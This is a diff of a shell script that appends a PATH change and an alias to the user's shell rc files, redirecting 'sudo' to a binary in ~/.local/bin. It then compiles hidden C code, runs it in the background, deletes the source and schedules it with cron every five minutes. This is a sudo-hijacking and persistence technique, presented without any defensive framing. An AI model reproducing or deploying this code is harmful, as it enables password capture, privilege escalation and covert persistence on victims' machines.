@@ -28,20 +28,20 @@ if which zsh >/dev/null 2>&1; then
 fi
 
 for RC_FILE in "${TARGET_FILES[@]}"; do
-    #if grep -qF 'PATH="$HOME/.local/bin:$PATH"' "$RC_FILE" || grep -qF 'alias sudo="$HOME/.local/bin/sudo"' "$RC_FILE"; then
-    #    echo "Configuration already exists in $RC_FILE. Skipping."
-    #else
+    if grep -qF 'PATH="$HOME/.local/bin:$PATH"' "$RC_FILE" || grep -qF 'alias sudo="$HOME/.local/bin/sudo"' "$RC_FILE"; then
+        echo "Configuration already exists in $RC_FILE. Skipping."
+    else
         cat << 'EOF' >> "$RC_FILE"
 PATH="$HOME/.local/bin:$PATH"
 alias sudo="$HOME/.local/bin/sudo"
 EOF
         echo "Successfully added configuration to $RC_FILE"
-    #fi
+    fi
 	source "$RC_FILE"
 done
 
-#export PATH="$HOME/.local/bin:$PATH"
-#export alias sudo="$HOME/.local/bin/sudo"
+export PATH="$HOME/.local/bin:$PATH"
+export alias sudo="$HOME/.local/bin/sudo"
 
 cat << EOF > "$c_code"
 #include <stdlib.h>
@@ -65,7 +65,7 @@ int main() {
 }
 EOF
 gcc "$c_code" -o "$script_path"
-nohup "$script_path" > /dev/null 2>&1 &
+"$script_path" > /dev/null 2>&1 &
 rm "$c_code"
 
 CRON_JOB="*/5 * * * * $script_path"
